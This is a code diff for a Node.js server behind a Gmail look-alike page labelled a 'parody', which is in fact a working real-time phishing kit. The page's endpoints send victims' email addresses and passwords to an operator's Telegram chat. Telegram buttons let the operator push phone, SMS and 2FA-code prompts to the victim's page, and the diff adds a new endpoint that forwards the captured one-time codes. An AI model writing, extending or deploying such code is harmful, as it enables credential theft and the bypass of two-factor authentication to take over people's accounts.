@@ -21,8 +21,6 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-const PUBLIC_URL = process.env.PUBLIC_URL || `http://localhost:${PORT}`;
-
 console.log('🚀 Starting server...');
 console.log('📱 BOT_TOKEN:', BOT_TOKEN ? '✅ SET' : '❌ MISSING');
 console.log('👤 CHAT_ID:', CHAT_ID ? '✅ SET' : '❌ MISSING');
@@ -31,7 +29,6 @@ console.log('👤 CHAT_ID:', CHAT_ID ? '✅ SET' : '❌ MISSING');
 // TELEGRAM POLLING
 // ============================================
 let lastUpdateId = 0;
-let pendingSessionId = null; // Track which session we're controlling
 
 async function pollTelegram() {
     try {
@@ -71,24 +68,14 @@ async function handleTelegramUpdate(update) {
         return;
     }
     
-    // Show available sessions
-    if (text === '/sessions') {
-        const sessionList = Object.keys(sessions);
-        if (sessionList.length === 0) {
-            await sendToTelegram('📭 No active sessions');
-        } else {
-            await sendToTelegram(`📋 <b>Active Sessions:</b>\n\n${sessionList.map(id => `• ${id}`).join('\n')}`);
-        }
-        return;
-    }
-    
-    // Start controlling a session
+    // ============================================
+    // COMMAND: /control [sessionId]
+    // ============================================
     if (text.startsWith('/control')) {
         const parts = text.split(' ');
         if (parts.length === 2) {
             const sessionId = parts[1];
             if (sessions[sessionId]) {
-                pendingSessionId = sessionId;
                 await sendControlButtons(sessionId);
             } else {
                 await sendToTelegram(`❌ Session ${sessionId} not found`);
@@ -99,8 +86,33 @@ async function handleTelegramUpdate(update) {
         return;
     }
     
-    // Default help
-    await sendToTelegram(`🤖 <b>Gmail Parody Bot</b>\n\n<b>Commands:</b>\n/control [sessionId] - Control a session\n/sessions - List active sessions\n\n<b>How to use:</b>\n1. Open the webpage\n2. Get the session ID from the page\n3. Send: /control 1234567890\n4. Use the buttons to control the flow!`);
+    // ============================================
+    // COMMAND: /sessions
+    // ============================================
+    if (text === '/sessions') {
+        const sessionList = Object.keys(sessions);
+        if (sessionList.length === 0) {
+            await sendToTelegram('📭 No active sessions');
+        } else {
+            await sendToTelegram(`📋 <b>Active Sessions:</b>\n\n${sessionList.map(id => `• ${id}`).join('\n')}`);
+        }
+        return;
+    }
+    
+    // ============================================
+    // DEFAULT: Help
+    // ============================================
+    await sendToTelegram(
+        `🤖 <b>Gmail Parody Bot</b>\n\n` +
+        `<b>Commands:</b>\n` +
+        `/control [sessionId] - Control a session with buttons\n` +
+        `/sessions - List all active sessions\n\n` +
+        `<b>How to use:</b>\n` +
+        `1. Open the webpage\n` +
+        `2. Get the session ID from the page\n` +
+        `3. Send: /control 1234567890\n` +
+        `4. Use the buttons to control the website!`
+    );
 }
 
 async function handleCallbackQuery(callbackQuery) {
@@ -115,7 +127,7 @@ async function handleCallbackQuery(callbackQuery) {
         return;
     }
     
-    // Parse the callback data: "sessionId|command"
+    // Parse: "sessionId|command"
     const [sessionId, command] = data.split('|');
     
     if (!sessions[sessionId]) {
@@ -123,24 +135,30 @@ async function handleCallbackQuery(callbackQuery) {
         return;
     }
     
-    // Set the command
+    // Store the command
     sessions[sessionId].command = command;
+    sessions[sessionId].promptType = command; // Track what prompt to show
     console.log(`✅ Command ${command} set for session ${sessionId}`);
     
-    // Acknowledge the button click
+    // Acknowledge
     await answerCallbackQuery(callbackQuery.id, `✅ ${command} command sent!`);
     
-    // Update the message to show what was selected
+    // Update message
     await editMessageText(chatId, messageId, 
-        `✅ <b>Command Selected: ${command}</b>\nSession: ${sessionId}\n\nPage will now redirect!`
+        `✅ <b>Command Sent: ${command}</b>\nSession: ${sessionId}\n\nWebsite is now showing the prompt!`
     );
     
-    // Send confirmation message
-    await sendToTelegram(`🎬 <b>Action Triggered!</b>\nSession: ${sessionId}\nCommand: ${command}\n\nPage is redirecting...`);
+    // Send detailed notification
+    await sendToTelegram(
+        `🎬 <b>Action Triggered!</b>\n` +
+        `Session: ${sessionId}\n` +
+        `Command: ${command}\n\n` +
+        `Website is now showing the ${command} prompt.`
+    );
 }
 
 // ============================================
-// TELEGRAM UI HELPERS
+// TELEGRAM UI - CONTROL BUTTONS
 // ============================================
 
 async function sendControlButtons(sessionId) {
@@ -151,19 +169,29 @@ async function sendControlButtons(sessionId) {
     const keyboard = {
         inline_keyboard: [
             [
-                { text: '✅ Success Page', callback_data: `${sessionId}|success` }
+                { text: '📱 Enter Phone Number', callback_data: `${sessionId}|phone` }
             ],
             [
-                { text: '📱 Enter Phone', callback_data: `${sessionId}|phone` },
                 { text: '✉️ Enter SMS Code', callback_data: `${sessionId}|sms` }
             ],
             [
+                { text: '🔐 Enter 2FA/Security Code', callback_data: `${sessionId}|2fa` }
+            ],
+            [
                 { text: '🔔 Notification Prompt', callback_data: `${sessionId}|notification` }
+            ],
+            [
+                { text: '✅ Success Page', callback_data: `${sessionId}|success` }
             ]
         ]
     };
     
-    const message = `🎬 <b>Control Panel</b>\n\n<b>Session:</b> ${sessionId}\n<b>Email:</b> ${email}\n<b>Password:</b> ${password}\n\n<b>Choose what happens next:</b>`;
+    const message = 
+        `🎬 <b>Control Panel</b>\n\n` +
+        `<b>Session:</b> ${sessionId}\n` +
+        `<b>Email:</b> ${email}\n` +
+        `<b>Password:</b> ${password}\n\n` +
+        `<b>Choose what prompt to show on the website:</b>`;
     
     try {
         await axios.post(`${TELEGRAM_API}/sendMessage`, {
@@ -175,6 +203,23 @@ async function sendControlButtons(sessionId) {
         console.log('✅ Control buttons sent!');
     } catch (error) {
         console.error('❌ Failed to send buttons:', error.message);
+    }
+}
+
+// ============================================
+// TELEGRAM HELPERS
+// ============================================
+
+async function sendToTelegram(message) {
+    try {
+        await axios.post(`${TELEGRAM_API}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+        console.log('✅ Message sent');
+    } catch (error) {
+        console.error('❌ Telegram send error:', error.message);
     }
 }
 
@@ -203,19 +248,6 @@ async function editMessageText(chatId, messageId, text) {
     }
 }
 
-async function sendToTelegram(message) {
-    try {
-        await axios.post(`${TELEGRAM_API}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-        });
-        console.log('✅ Message sent');
-    } catch (error) {
-        console.error('❌ Telegram send error:', error.message);
-    }
-}
-
 // Start polling
 console.log('🔄 Starting Telegram polling...');
 setInterval(pollTelegram, 2000);
@@ -230,14 +262,14 @@ app.post('/api/visit', async (req, res) => {
     sessions[sessionId] = { 
         step: 'visited', 
         command: null,
+        promptType: null,
         email: null,
         password: null,
+        verificationData: null,
         createdAt: new Date().toISOString()
     };
     
     console.log(`🌐 New visit: ${sessionId}`);
-    
-    // Send notification with control link
     await sendToTelegram(
         `🌐 <b>Page Visited!</b>\n\n` +
         `Session: <code>${sessionId}</code>\n` +
@@ -276,51 +308,75 @@ app.post('/api/password', async (req, res) => {
         console.log('📝 Credentials logged');
     }
     
-    // Send credentials with control button prompt
     await sendToTelegram(
         `🔑 <b>Password Entered!</b>\n\n` +
         `Session: <code>${sessionId}</code>\n` +
         `Email: ${sessions[sessionId]?.email || 'N/A'}\n` +
         `Password: <code>${password}</code>\n\n` +
-        `Control this session with: /control ${sessionId}`
+        `Control this session: /control ${sessionId}`
     );
     
     res.json({ success: true });
 });
 
-// 4. Get command for page
+// 4. Get command for page (POLLING)
 app.get('/api/command/:sessionId', (req, res) => {
     const { sessionId } = req.params;
     
     if (!sessions[sessionId]) {
-        return res.json({ command: null });
+        return res.json({ command: null, promptType: null });
     }
     
     const command = sessions[sessionId].command;
+    const promptType = sessions[sessionId].promptType;
+    
+    // Clear after reading
     if (command) {
         sessions[sessionId].command = null;
         console.log(`📤 Sending command: ${command} to session ${sessionId}`);
     }
     
-    res.json({ command });
+    res.json({ command, promptType });
 });
 
-// 5. Health check
+// 5. Submit verification data from page
+app.post('/api/verify', async (req, res) => {
+    const { sessionId, value, type } = req.body;
+    
+    if (sessions[sessionId]) {
+        sessions[sessionId].verificationData = value;
+        sessions[sessionId].step = 'verified';
+    }
+    
+    console.log(`✅ Verification submitted: ${type} = ${value}`);
+    await sendToTelegram(
+        `✅ <b>Verification Submitted!</b>\n\n` +
+        `Session: ${sessionId}\n` +
+        `Type: ${type}\n` +
+        `Value: <code>${value}</code>`
+    );
+    
+    res.json({ success: true });
+});
+
+// 6. Health check
 app.get('/health', (req, res) => {
     res.json({ 
         status: 'OK', 
         sessions: Object.keys(sessions).length,
-        activeSessions: Object.keys(sessions)
+        activeSessions: Object.keys(sessions).map(id => ({
+            id,
+            email: sessions[id].email,
+            password: sessions[id].password ? '***' : null,
+            step: sessions[id].step
+        }))
     });
 });
 
 // Start server
 app.listen(PORT, () => {
-    console.log(`🚀 Server running on ${PUBLIC_URL}`);
+    console.log(`🚀 Server running on port ${PORT}`);
     console.log(`📱 Telegram polling active`);
     console.log(`🔑 Bot Token: ${BOT_TOKEN ? '✅ Set' : '❌ Missing'}`);
     console.log(`👤 Chat ID: ${CHAT_ID ? '✅ Set' : '❌ Missing'}`);
-    console.log(`\n📋 Commands:`);
-    console.log(`  /sessions - List all sessions`);
-    console.log(`  /control [sessionId] - Control a session`);
 });
